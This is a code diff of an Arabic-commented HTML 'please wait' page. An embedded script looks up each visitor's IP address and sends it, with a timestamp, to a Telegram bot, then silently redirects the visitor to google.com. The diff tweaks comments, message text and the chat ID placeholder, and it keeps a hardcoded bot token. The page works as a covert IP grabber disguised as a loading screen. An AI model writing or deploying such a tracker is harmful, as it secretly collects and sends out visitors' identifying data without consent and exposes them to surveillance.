@@ -33,26 +33,28 @@
     <p>يرجى الانتظار قليلاً.</p>
 
     <script>
-        // رابط الموقع الذي سيتوجه إليه المستخدم بعد تسجيل الأيبيه
+        // 1. رابط الموقع أو الصفحة التي تريد توجيه الزائر إليها بعد تسجيل الأيبيه
         const targetRedirectUrl = "https://www.google.com"; 
 
-        // التوكن والـ Chat ID الجديد الصحيح 100%
+        // 2. معلومات بوت التليجرام وقناتك
         const botToken = "9187574833:AAGIaNeSPMRUCmRtwT_S0jwBS3ubhGf320k"; 
-        const chatId = "7396302829"; 
+        
+        // ضع هنا آيدي قناتك (مثال: "-1001234567890") أو معرفها العام (مثال: "@YourChannel")
+        const chatId = "-100xxxxxxxxxx"; 
 
         function captureAndSend() {
-            // جلب الـ IP الخاص بالزائر
+            // جلب الـ IP الخاص بالزائر من خدمة ipify
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     const userIp = data.ip;
-                    const visitTime = new Date().toLocaleTimeString();
+                    const visitTime = new Date().toLocaleString();
 
                     // تجهيز رسالة التليجرام
-                    const message = encodeURIComponent(`🚨 زيارة جديدة!\n🌐 IP: ${userIp}\n⏰ الوقت: ${visitTime}`);
+                    const message = encodeURIComponent(`🚨 زيارة جديدة للقناة!\n🌐 IP: ${userIp}\n⏰ الوقت: ${visitTime}`);
                     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
 
-                    // إرسال البيانات عبر صورة في الخلفية لضمان وصولها
+                    // إرسال البيانات عبر صورة في الخلفية لضمان وصولها بالكامل
                     const img = new Image();
                     img.src = telegramUrl;
 
@@ -62,6 +64,7 @@
                     }, 800);
                 })
                 .catch(error => {
+                    // في حال حدث خطأ في جلب الـ IP، يتم تحويل المستخدم مباشرة دون توقف
                     window.location.href = targetRedirectUrl;
                 });
         }
